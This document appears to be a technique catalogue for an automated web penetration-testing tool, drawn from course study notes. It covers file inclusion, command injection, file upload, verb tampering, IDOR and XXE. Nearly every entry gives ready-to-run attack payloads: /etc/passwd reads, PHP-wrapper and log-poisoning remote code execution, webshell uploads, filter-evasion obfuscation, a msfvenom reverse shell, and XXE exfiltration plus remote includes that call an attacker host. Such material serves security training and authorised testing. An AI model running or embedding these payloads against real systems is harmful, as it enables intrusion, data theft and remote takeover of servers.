## TECH: lfi-basic-passwd-read
- vault: File Inclusion/02-LFI-Basics.md
- class: auto
- when: param looks like path/page selector (?page= ?language= ?lang= ?template= ?view= ?file= ?doc=) controlling which sub-page/asset loads
- probe: curl -s "{URL}?{PARAM}=/etc/passwd" ; curl -s "{URL}?{PARAM}=C:\\Windows\\boot.ini" (Windows target) ; curl -s "{URL}?{PARAM}=es.php" baseline first to compare response shape
- detect: 'root:' line + /bin/false or /bin/bash entries in response body; boot.ini returns '[boot loader]' on Windows; response differs from baseline error/empty page
- sev: high

## TECH: lfi-path-traversal
- vault: File Inclusion/02-LFI-Basics.md
- class: auto
- when: LFI param exists but app prepends a directory (./languages/ + input) so absolute path returns empty/error; or prefix like lang_ glued before input
- probe: curl -s "{URL}?{PARAM}=../../../../etc/passwd" (over-traverse 8-10 levels, ../ at root stays at root) ; curl -s "{URL}?{PARAM}=/../../../etc/passwd" (leading / defeats filename prefix lang_) ; curl -s "{URL}?{PARAM}=/etc/passwd%00" (legacy PHP<5.5 null byte vs appended .php)
- detect: 'root:' in body after ../ padding but not on plain /etc/passwd; leading-slash variant returns passwd content when prefix is glued
- sev: high

## TECH: lfi-filter-bypass-traversal
- vault: File Inclusion/03-LFI-Bypasses.md
- class: auto
- when: traversal input returns 'Illegal path specified!' / 'invalid input' → non-recursive str_replace, char encoding filter, or regex path whitelist in place
- probe: curl -s "{URL}?{PARAM}=....//....//....//....//etc/passwd" (recursive; variants ..././ ....\\/ ....////) ; curl -s "{URL}?{PARAM}=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64" (full URL-encode incl dots, then double-encode) ; curl -s "{URL}?{PARAM}=./languages/../../../../etc/passwd" (start with approved prefix then traverse out) ; ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u '{URL}?{PARAM}=FUZZ' -fs <baseline-size>
- detect: 'root:' returned for any bypass variant; ffuf hits with size != baseline need manual re-verify of real inclusion
- sev: high

## TECH: lfi-php-filter-source-read
- vault: File Inclusion/04-PHP-Filters-and-Wrappers.md
- class: auto
- when: LFI confirmed on PHP app; including .php files renders executed output instead of source; need source/config disclosure (creds, further file refs)
- probe: curl -s "{URL}?{PARAM}=php://filter/read=convert.base64-encode/resource=index" (appended .php auto-completes) ; curl -s "{URL}?{PARAM}=php://filter/read=convert.base64-encode/resource=config" ; ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u '{URL}/FUZZ.php' (accept 301/302/403 too — source still readable) ; echo 'BASE64' | base64 -d ; php.ini read: curl -s "{URL}?{PARAM}=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | base64 -d | grep -E 'allow_url_include|extension=expect' (nginx: /etc/php/X.Y/fpm/php.ini)
- detect: long base64 blob in response that decodes to '<?php' source; grep hits 'allow_url_include = On' or 'extension=expect' in decoded php.ini → enables RCE wrappers
- sev: high

## TECH: lfi-hidden-param-and-file-fuzz
- vault: File Inclusion/08-Automated-Scanning-and-Tools.md
- class: auto
- when: no obvious ?page= param found; or LFI confirmed and need webroot/config/log paths for chaining
- probe: ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u '{URL}?FUZZ=value' -fs <baseline> ; ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-webroot-directory-linux.txt:FUZZ -u '{URL}?{PARAM}=../../../../FUZZ/index.php' -fs <baseline> ; ffuf -w ./LFI-WordList-Linux:FUZZ -u '{URL}?{PARAM}=../../../../FUZZ' -fs <baseline>
- detect: param fuzz returns response-size anomalies vs baseline; discovered /etc/apache2/apache2.conf + envvars resolve APACHE_LOG_DIR → /var/log/apache2 for log poisoning chain; always manually re-verify hits
- sev: med

## TECH: lfi-rce-php-wrappers
- vault: File Inclusion/04-PHP-Filters-and-Wrappers.md
- class: manual
- when: LFI on include()-capable PHP + allow_url_include=On confirmed via php.ini read (data://, php://input) or extension=expect confirmed (expect://)
- probe: data:// → echo '<?php system($_GET["cmd"]); ?>' | base64 then curl -s "{URL}?{PARAM}=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id" ; php://input → curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' '{URL}?{PARAM}=php://input&cmd=id' (if app reads $_POST only: hardcode '<?php system('id')?>') ; expect:// → curl -s "{URL}?{PARAM}=expect://id"
- detect: 'uid=' + username in response (id output) = command execution confirmed; wrapper needs no upload or poisoning
- sev: high

## TECH: rfi-verify-and-rce
- vault: File Inclusion/05-RFI.md
- class: manual
- when: vuln function supports remote URLs (PHP include/include_once/file_get_contents, Java c:import, .NET RemotePartial) + allow_url_include=On; param fully controls scheme
- probe: verify first (benign): curl -s "{URL}?{PARAM}=http://127.0.0.1:80/index.php" (loopback, avoid including the vulnerable page itself → recursion DoS) ; RCE: echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server 80, then curl -s "{URL}?{PARAM}=http://{ATTACKER_IP}:80/shell.php&cmd=id" ; FTP variant if http:// string WAF-blocked: python -m pyftpdlib -p 21, then {PARAM}=ftp://{ATTACKER_IP}/shell.php&cmd=id ; Windows SMB (no allow_url_include needed): impacket-smbserver -smb2support share $(pwd), then {PARAM}=\\\\{ATTACKER_IP}\\share\\shell.php&cmd=whoami
- detect: loopback include renders executed PHP (not raw text) → execute-capable + remote enabled; &cmd=id returns 'uid='/'NT AUTHORITY' output
- sev: high

## TECH: lfi-upload-chain-rce
- vault: File Inclusion/06-LFI-File-Uploads.md
- class: manual
- when: LFI into execute-capable function (include/require, res.render, jsp:include, #include) AND any file-upload feature exists (avatar/profile image) — no vulnerable upload form needed
- probe: echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif → upload via form → find path in page source (<img src="/profile_images/shell.gif">) → curl -s "{URL}?{PARAM}=./profile_images/shell.gif&cmd=id" (traverse ../ first if dir prepended) ; zip variant: zip shell.jpg shell.php (containing <?php system($_GET["cmd"]); ?>) then {PARAM}=zip://./profile_images/shell.jpg%23shell.php&cmd=id ; phar variant: phar archive w/ stub '<?php __HALT_COMPILER(); ?>' renamed shell.jpg, then {PARAM}=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
- detect: 'uid=' output via &cmd= on the include request; magic bytes GIF8 pass MIME checks; reliability order: direct image > zip:// > phar://
- sev: high

## TECH: lfi-session-poisoning
- vault: File Inclusion/07-Log-Poisoning.md
- class: manual
- when: LFI + PHP sessions in use (PHPSESSID cookie) + session file readable via LFI; session field (page) mirrors the vulnerable param value
- probe: read structure: curl -s "{URL}?{PARAM}=/var/lib/php/sessions/sess_{PHPSESSID}" (Windows: C:\Windows\Temp\) ; confirm control: {PARAM}=session_poisoning then re-read, look for 'page|s:17:"session_poisoning"' ; poison: {PARAM}=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E then curl -s "{URL}?{PARAM}=/var/lib/php/sessions/sess_{PHPSESSID}&cmd=id" — re-poison before EACH new command (inclusion overwrites), or first hit drops persistent shell in webroot
- detect: session file read shows controllable 'page' field reflecting input; &cmd=id returns 'uid=' output
- sev: high

## TECH: lfi-log-poisoning
- vault: File Inclusion/07-Log-Poisoning.md
- class: manual
- when: LFI + readable log file (nginx logs often www-data readable; apache usually root/adm only) or /proc/self/environ, /proc/self/fd/N — and a logged field (User-Agent etc.) is attacker-controlled
- probe: confirm read: curl -s "{URL}?{PARAM}=/var/log/nginx/access.log" (or /var/log/apache2/access.log, C:\xampp\apache\logs\ on Win) ; poison UA: curl -s "{URL}" -H 'User-Agent: <?php system($_GET["cmd"]); ?>' ; execute: curl -s "{URL}?{PARAM}=/var/log/nginx/access.log&cmd=id" ; alt surfaces: /proc/self/environ, /proc/self/fd/N (N=0-50), /var/log/sshd.log (poison via SSH username), /var/log/mail, /var/log/vsftpd.log
- detect: log content readable via LFI (own UA/IP visible in it); poisoned UA appears in log; &cmd=id returns 'uid=' — keep requests minimal, huge logs can DoS the app
- sev: high

## TECH: cmdi-operator-canary
- vault: Command Injection/02-Detection-and-Injection-Operators.md, Command Injection/03-Injecting-Commands-and-Bypassing-Frontend.md
- class: auto
- when: input feeds a system command (ping/host/filename utilities; PHP system/exec/shell_exec/passthru, Node child_process.exec) and output is reflected; canary = benign whoami/echo only, no destructive payload
- probe: baseline: {PARAM}=127.0.0.1 → then operators one at a time: {PARAM}='127.0.0.1; whoami' (URL-enc %3B) ; '127.0.0.1%0a whoami' (newline, often unfiltered) ; '127.0.0.1 && whoami' ; '127.0.0.1 || whoami' (or break first cmd: '|| whoami' alone for clean single output) ; '127.0.0.1 | whoami' (only 2nd output shown) ; '127.0.0.1`whoami`' ; '127.0.0.1$(whoami)' (Linux only for backticks/$()) ; if frontend JS blocks with no HTTP request fired → resend via Burp Repeater with URL-encoding (client-side validation = zero security)
- detect: whoami username appended to normal ping output (';' '&&' newline backticks $()) or replacing it ('|','||'); Windows CMD: ';' fails but works in PowerShell; response changed vs baseline = injection confirmed
- sev: high

## TECH: cmdi-filter-mapping
- vault: Command Injection/04-Identifying-Filters.md
- class: auto
- when: canary payload rejected with 'Invalid input' — need to map WHICH chars/words are blacklisted and whether blocker is app filter or WAF
- probe: strip to minimum, add ONE element at a time: {PARAM}='127.0.0.1;' → '127.0.0.1;whoami' → '127.0.0.1; whoami' (isolates operator vs word vs space) ; repeat per operator/char/command word to build full blocklist map
- detect: inline generic error in app's own output field = app-level filter; entirely different block page showing your IP/request details = WAF; whichever single addition flips baseline→error identifies the blacklisted element; newline %0a frequently NOT blacklisted
- sev: med

## TECH: cmdi-char-filter-bypass
- vault: Command Injection/05-Bypassing-Character-Filters.md
- class: manual
- when: filter map shows spaces, slashes, or semicolons blacklisted but injection operator still reaches shell
- probe: space bypass: '{PARAM}=127.0.0.1%0a%09whoami' (tab) ; '127.0.0.1%0a${IFS}whoami' (Linux IFS) ; '127.0.0.1%0a{ls,-la}' (bash brace expansion) ; slash/semicolon via env-var slicing: ${PATH:0:1} = '/', ${LS_COLORS:10:1} = ';' → '127.0.0.1${LS_COLORS:10:1}${IFS}whoami' ; char shifting: $(tr '!-}' '"-~'<<<[) produces '\' ; Windows CMD: %HOMEPATH:~6,-11% isolates '\', PowerShell: $env:HOMEPATH[0]
- detect: blocked-space payload suddenly returns whoami/command output when tab/IFS/braces substituted; env-sliced payload executes despite literal / or ; never appearing in request
- sev: high

## TECH: cmdi-word-blacklist-bypass
- vault: Command Injection/06-Bypassing-Command-Blacklists.md
- class: manual
- when: operator + chars pass but exact command words (whoami, cat...) blocked by strpos-style literal match
- probe: quote insertion (even count, never mix types): '{PARAM}=w'h'o'am'i' or 'w"h"o"am"i' ; Linux backslash/positional: 'who$@ami', 'w\ho\am\i' (no pairing needed) ; Windows caret: 'who^ami'
- detect: obfuscated word executes (username returned) while literal word was blocked; if still failing, check a blacklisted char (usually space) was reintroduced alongside the obfuscation
- sev: high

## TECH: cmdi-advanced-obfuscation
- vault: Command Injection/07-Advanced-Obfuscation.md, Command Injection/08-Evasion-Tools.md
- class: manual
- when: WAF or advanced filter defeats quote/case tricks; signatures match known payloads
- probe: case: Windows 'WhOaMi' direct; Linux '$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")' or '$(a="WhOaMi";printf %s "${a,,}")' (spaces→%09 if filtered) ; reversed: echo 'whoami' | rev → '$(rev<<<"imaohw")' ; PowerShell: iex "$('imaohw'[-1..-20] -join '')" ; base64 Linux: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) (<<< avoids filtered pipe) ; base64 Windows: iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" (UTF-16LE) ; tools: bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1 ; Invoke-DOSfuscation (encoding menu)
- detect: obfuscated payload returns identical output to plain command; hand-crafted variants evade signature (verify locally with bash -c before firing)
- sev: high

## TECH: upload-webshell-direct
- vault: File Upload/02-Absent-Validation-and-Exploitation.md, File Upload/03-Client-Side-Validation.md
- class: manual
- when: upload form found with no type restriction (no accept= filter, 'All Files' picker) OR validation is client-side only (JS error fires with NO HTTP request in DevTools Network tab)
- probe: fingerprint runtime first: probe /index.php /index.asp /index.aspx (Burp Intruder + web-extensions wordlist, or Wappalyzer) ; PoC: echo '<?php echo "Hello HTB";?>' > test.php → upload → visit {URL}/uploads/test.php ; full shell: '<?php system($_REQUEST["cmd"]); ?>' as shell.php → curl -s "{URL}/uploads/shell.php?cmd=id" (view via CTRL+U for raw output) ; client-side-only: capture legit upload in Burp, swap filename="HTB.png"→shell.php + file content to shell code, forward; or DevTools-delete onchange="checkFile(this)" hook then upload normally ; reverse shell: msfvenom -p php/reverse_php LHOST={ATTACKER_IP} LPORT={PORT} -f raw > reverse.php + nc -lvnp {PORT}
- detect: 'Hello HTB' rendered = code execution confirmed; ?cmd=id returns 'uid='; raw PHP source shown instead = content not executed (different issue); nc callback = full shell
- sev: high

## TECH: upload-blacklist-ext-fuzz
- vault: File Upload/04-Blacklist-Filters.md
- class: manual
- when: upload rejects .php but 'File type not allowed' implies extension blacklist (in_array on PATHINFO_EXTENSION)
- probe: Burp Intruder: mark ONLY extension in filename="HTB.php", payload list = .phtml .php3 .php4 .php5 .php7 .pht .phar .inc .PHP (case variants for Windows), untick URL-encode, sort by response length ; then test execution of survivors: curl -s "{URL}/profile_images/shell.phtml?cmd=id"
- detect: consistent length + 'File successfully uploaded' = extension passed blacklist; different length + 'Extension not allowed' = blocked; .phtml most often executes (default handler mapping); upload success != execution — must confirm 'uid=' on the survivor
- sev: high

## TECH: upload-whitelist-double-ext
- vault: File Upload/05-Whitelist-Filters.md
- class: manual
- when: whitelist regex only checks extension appears anywhere in filename (no $ anchor) — 'Only images are allowed' despite extension tricks
- probe: double extension: filename="shell.jpg.php" → curl -s "{URL}/profile_images/shell.jpg.php?cmd=id" ; reverse double ext (server misconfig, Apache FilesMatch '.+\.ph(ar|p|tml)' unanchored): filename="shell.php.jpg" → curl -s "{URL}/profile_images/shell.php.jpg?cmd=id" ; char injection last resort: filename="shell.php%00.jpg" (PHP≤5.x null byte), "shell.aspx:.jpg" (IIS NTFS ADS), trailing dot / %20 / %0a / … — generate permutations: for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '…' ':'; do for ext in '.php' '.phps'; do echo "shell$char$ext.jpg"; done; done → Intruder
- detect: 'File successfully uploaded' + ?cmd=id returns 'uid=' → note reverse-double-ext is a web-server config flaw (report separately); priority: unanchored app regex → server handler misconfig → char injection
- sev: high

## TECH: upload-contenttype-mime-bypass
- vault: File Upload/06-Type-Filters-ContentType-MIME.md
- class: manual
- when: extension bypasses alone still yield 'Only images are allowed' — server checks file part Content-Type header and/or MIME magic bytes (mime_content_type)
- probe: Content-Type: capture upload in Burp, set the file PART's Content-Type: image/jpeg (not the top-level header), keep filename+shell body → curl -s "{URL}/profile_images/shell.php?cmd=id" ; magic bytes: printf 'GIF8<?php system($_REQUEST["cmd"]); ?>' > shell.php ('GIF8' is plain-ASCII GIF signature, enough for MIME sniffers) → upload → curl -s "{URL}/profile_images/shell.php?cmd=id" ; fuzz allowed types: grep 'image/' web-all-content-types.txt (SecLists) into Intruder on the Content-Type field
- detect: upload accepted with spoofed image/jpeg header; GIF8-prefixed payload executes ('GIF8' cosmetic prefix in output before 'uid='); layered filters → try MIME/ContentType/extension permutations to find weakest check
- sev: high

## TECH: upload-svg-xss-xxe
- vault: File Upload/07-Limited-Uploads-XSS-XXE-DoS.md
- class: manual
- when: upload restricted to images/XML docs but SVG (or PDF/DOCX/PPTX/XML) accepted — extension/content checks solid, secondary attack surface needed
- probe: SVG XSS: upload SVG containing <script>alert(window.origin)</script> inside <svg> element (fires on display) ; metadata XSS: exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg (fires if metadata rendered) ; SVG XXE file read: <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> + <svg>&xxe;</svg> ; SVG XXE source read: <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> → decode
- detect: alert fires when SVG displayed = stored XSS; passwd content or base64 blob (decodes to <?php) inside rendered SVG = XXE file read; source read reveals uploads dir path + naming scheme for further chains
- sev: high

## TECH: upload-filename-dir-tricks
- vault: File Upload/08-Other-Upload-Attacks.md
- class: manual
- when: uploaded FILENAME is reflected, listed, or passed into another server operation (mv, SQL insert, display) unsanitized; or uploaded file path not disclosed
- probe: filename cmd injection: 'file$(whoami).jpg', 'file`whoami`.jpg', 'file.jpg||whoami' ; filename XSS: '<script>alert(window.origin);</script>' ; filename SQLi: "file';select+sleep(5);--.jpg" (detect via 5s delay) ; dir disclosure: upload duplicate filename or two simultaneous identical requests (race) → error leaks path; ~5000-char filename → error leak ; Windows: reserved names CON COM1 LPT1 NUL trigger errors; chars | < > * ? ; 8.3 short-name WEB~1.CON may overwrite web.config
- detect: whoami output or reflected username anywhere in response/listing; script tag rendered in file listing; sleep(5) timing delay; error message containing absolute uploads path; Windows reserved-name error = info disclosure
- sev: med

## TECH: http-verb-tampering
- vault: Web Attacks/01-HTTP-Verb-Tampering.md
- class: auto
- when: endpoint has auth or an input filter (Basic Auth 401, WAF block page, 'Malicious Request Denied!') — probe whether protection is scoped to specific verbs
- probe: curl -i -X OPTIONS "{URL}" (read Allow: header — POST,OPTIONS,HEAD,GET) ; curl -I -X HEAD "{URL}/admin/reset.php" (headers-only, often unauthenticated) ; curl -i -X POST "{URL}/admin/reset.php" (Burp right-click → Change Request Method) ; filter bypass: resend blocked GET payload as POST — filter checks $_GET but query uses $_REQUEST (PHP), request.getParameter (Java), Request[] (C#)
- detect: OPTIONS returns Allow list incl. verbs beyond the protected one; HEAD/POST returns 200 where GET returned 401/403 = auth bypass; blocked payload passes filter when verb swapped (chain into cmd injection e.g. 'file1; touch file2;') — 200-vs-403 and pass-vs-block are the signatures
- sev: high

## TECH: idor-id-swap-diff
- vault: Web Attacks/02-IDOR.md
- class: auto
- when: URL param/API references an object directly (?uid=1, ?file_id=124, /documents.php?uid=, filename=file_1.pdf) — refs may also hide in cookies/headers, AJAX JS, or as base64/MD5 hashes
- probe: capture own-request baseline as user A: curl -s "{URL}/documents.php?uid={MY_UID}" ; swap: curl -s "{URL}/documents.php?uid=2" then uid=3... (sequential neighbors) ; diff response CONTENT not just status — pages may render identically except embedded file links ; two-account diff: register 2 accounts, compare how refs are derived between roles ; check front-end JS for hash logic (CryptoJS.MD5('file_1.pdf'))
- detect: uid=2 returns DIFFERENT user's document links/data than uid=1 (different .pdf hrefs, different names/emails) = broken object-level access control; role/privilege field client-editable (Cookie: role=employee, body 'role':) = near-certain exploitable
- sev: high

## TECH: idor-hash-and-api-enum
- vault: Web Attacks/02-IDOR.md
- class: manual
- when: IDOR refs are hashed/base64-encoded (client-computed MD5/btoa visible in JS) or target is a JSON API with PUT/POST/DELETE acting on objects
- probe: replicate hash: echo -n 1 | base64 -w 0 | md5sum → for i in {1..10}; do hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); curl -sOJ -X POST -d "contract=$hash" "{URL}/download.php"; done ; API function calls: PUT /api/profile/2 with own uuid → watch for 'uid mismatch'/'uuid mismatch' checks ; POST/DELETE as low-priv role ; modify own 'role' field to leaked admin role name ; chain: GET IDOR leaks victim uuid → PUT IDOR with victim uuid passes ownership check → set role=admin
- detect: downloaded files for other users (curl -OJ saves them); 'uid mismatch' vs silent success reveals check granularity; privileged action succeeds as standard user = insecure function call; account takeover chain = change victim email → password reset
- sev: high

## TECH: xxe-entity-file-read
- vault: Web Attacks/03-XXE.md
- class: auto
- when: XML endpoint found (contact form, SOAP API, SVG/DOCX/PDF upload) — or try converting JSON body to XML with Content-Type: application/xml
- probe: benign entity reflect first: <!DOCTYPE email [ <!ENTITY company "test"> ]> ... <email>&company;</email> ; benign file read: <!DOCTYPE email [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]> + &xxe; (also /etc/passwd) ; PHP source read: <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> → base64 -d
- detect: response renders 'test' (or hostname/passwd content) instead of literal '&company;'/'&xxe;' = parser resolves custom+external entities = XXE confirmed; base64 blob decodes to source
- sev: high

## TECH: xxe-advanced-exfil-rce
- vault: Web Attacks/03-XXE.md
- class: manual
- when: XXE confirmed but output not reflected (blind), breaks on special chars (non-PHP), or RCE desired
- probe: CDATA wrap (host xxe.dtd on {ATTACKER_IP}): <!ENTITY % begin "<![CDATA["> / <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> / <!ENTITY % end "]]>"> / <!ENTITY % joined "%begin;%file;%end;"> → victim: <!ENTITY % xxe SYSTEM "http://{ATTACKER_IP}:8000/xxe.dtd"> %xxe; + &joined; ; error-based: <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>"> → file content leaks in error msg ; OOB exfil: <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> + <!ENTITY % oob "<!ENTITY content SYSTEM 'http://{ATTACKER_IP}:8000/?content=%file;'>"> → PHP listener logging base64_decode($_GET['content']) (DNS subdomain variant if HTTP egress blocked) ; RCE (expect ext): <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'{ATTACKER_IP}/shell.php'"> (spaces→$IFS, avoid | > {) ; automated: ruby XXEinjector.rb --host={ATTACKER_IP} --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
- detect: HTTP listener receives request with base64 content param → decodes to file contents; error message embeds /etc/hosts content; shell.php fetched to webroot then reachable = RCE
- sev: high
